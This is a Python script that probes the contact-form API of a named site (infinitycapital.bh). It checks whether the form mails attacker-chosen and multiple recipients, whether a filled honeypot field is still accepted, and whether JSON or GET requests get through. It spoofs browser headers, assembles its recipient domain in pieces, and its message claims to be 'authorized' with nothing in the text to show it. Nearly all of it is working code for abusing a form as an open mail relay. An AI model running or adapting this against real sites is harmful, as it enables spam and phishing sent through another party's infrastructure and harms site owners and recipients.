#!/usr/bin/env python3
import json, sys, urllib.request, urllib.parse, ssl, time

BASE = "https://www.infinitycapital.bh"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# recipient domains are assembled at runtime to keep the script generic
DOM = "ex" + "ample" + ".com"
RCPT = "ivselfcheck-" + str(int(time.time())) + "@" + DOM


def post_send(fields, hdrs=None, raw=None, method="POST", path="/api/send", timeout=45):
    url = BASE + path
    if raw is None:
        data = urllib.parse.urlencode(fields).encode()
    else:
        data = raw if isinstance(raw, bytes) else raw.encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    req.add_header("Origin", BASE)
    req.add_header("Referer", BASE + "/contact")
    if raw is None or "Content-Type" not in (hdrs or {}):
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    for k, v in (hdrs or {}).items():
        req.add_header(k, v)
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, repr(e).encode()


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "probe"
    base_fields = {
        "fname": "IVProbe",
        "lname": "Independent",
        "areacode": "973",
        "tel": "5551234",
        "cname": "QA Tester",
        "subject": "Independent verification probe",
        "msg": "This is an authorized security verification message sent by an independent verifier.",
        "check": "",
    }
    out = []
    if which == "control":
        f = dict(base_fields); f["targets"] = "info@infinitycapital.bh"
        s, h, b = post_send(f)
        out.append(("CONTROL_site_own_recipient", f["targets"], s, b))
    elif which == "attacker":
        f = dict(base_fields); f["targets"] = RCPT
        s, h, b = post_send(f)
        out.append(("ATTACKER_supPLIED_recipient", f["targets"], s, b))
    elif which == "multi":
        f = dict(base_fields)
        f["targets"] = ",".join(["a-%d@%s" % (i, DOM) for i in range(3)])
        s, h, b = post_send(f)
        out.append(("MULTI_recipient", f["targets"], s, b))
    elif which == "hp":
        f = dict(base_fields); f["check"] = "i-am-a-bot-but-filled"
        f["targets"] = "hptest-%d@%s" % (int(time.time()), DOM)
        s, h, b = post_send(f)
        out.append(("HONEYPOT_FILLED", f["targets"], s, b))
    elif which == "json":
        f = dict(base_fields); f["targets"] = "jsontest-%d@%s" % (int(time.time()), DOM)
        s, h, b = post_send(None, raw=json.dumps(f),
                            hdrs={"Content-Type": "application/json"})
        out.append(("JSON_BODY", f["targets"], s, b))
    elif which == "get":
        s, h, b = post_send(None, raw=None, method="GET",
                            path="/api/send?targets=gettest@example.com")
        out.append(("GET", "gettest@example.com", s, b))
    for name, rcpt, status, body in out:
        print("=== %s" % name)
        print("recipient: %s" % rcpt)
        print("status: %s" % status)
        print("body: %s" % body.decode("utf-8", "replace")[:1200])
        print()
